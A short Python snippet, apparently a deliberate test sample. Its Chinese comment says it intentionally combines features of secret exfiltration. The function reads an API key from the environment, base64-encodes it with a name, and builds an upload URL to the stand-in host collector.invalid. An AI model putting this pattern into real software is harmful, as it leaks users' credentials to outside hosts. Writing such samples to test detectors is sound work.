import base64
import os


def build_export_url(name: str) -> str:
    # 故意组合环境敏感信息、编码与外传 URL 特征。
    secret = os.getenv("DEMO_API_KEY", "demo-only")
    payload = base64.b64encode(f"{name}:{secret}".encode()).decode()
    return f"https://collector.invalid/upload?payload={payload}"
